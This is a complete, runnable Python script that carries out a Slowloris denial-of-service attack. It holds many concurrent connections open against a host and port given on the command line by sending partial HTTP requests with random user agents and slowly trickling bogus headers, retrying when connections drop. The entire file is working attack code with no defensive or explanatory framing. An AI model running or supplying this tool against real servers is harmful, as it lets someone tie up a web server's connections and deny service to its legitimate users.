from argparse import ArgumentParser
import asyncio
from functools import partial
import random
from string import ascii_letters
from typing import Callable, Generator

from fake_useragent import UserAgent

from utils import retry


# Initialize fake user agent object at the top level because
# initializing it talks to some online user agent database or
# to the file system.
USER_AGENT = UserAgent()


def generate_user_agent() -> str:
    return USER_AGENT.random


def random_offset() -> float:
    return random.uniform(-0.5, 0.5)


async def headers(mean_sleep: float) -> Generator[bytes, None, None]:
    await asyncio.sleep(random.random())
    yield f'GET /{random.choice(ascii_letters)} HTTP/1.1\r\n'.encode('ascii')
    await asyncio.sleep(mean_sleep + random_offset())
    yield ('User-Agent: ' + generate_user_agent() + '\r\n').encode('ascii')
    while True:
        await asyncio.sleep(mean_sleep + random_offset())
        random_chars = random.sample(ascii_letters, random.randrange(3, 8))
        yield (
            ''.join(random_chars[:-1]) + ': ' + random_chars[-1] + '\r\n'
        ).encode('ascii')


@retry(on=(ConnectionRefusedError, ConnectionResetError), retries=3)
async def slow_loris(address: tuple[str, int], mean_sleep: float) -> None:
    print('Connected to server')
    _, server = await asyncio.open_connection(*address)
    async for header in headers(mean_sleep):
        print(f'Sending "{header}" to server')
        server.write(header)
        await server.drain()


async def main(
    address: tuple[str, int],
    loris_count: int,
    mean_sleep: float=20,
) -> None:
    lorises = [
        asyncio.create_task(slow_loris(address, mean_sleep))
        for _ in range(loris_count)
    ]
    await asyncio.gather(*lorises)


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('host', nargs='?', default='127.0.0.1')
    parser.add_argument('-p', dest='port', type=int, default=80)
    parser.add_argument(
        '-N',
        dest='loris_count',
        type=int,
        default=4,
        help='Number of lorises to connect to the server',
    )
    args = parser.parse_args()

    address = (args.host, args.port)
    asyncio.run(main(address, args.loris_count, 20))
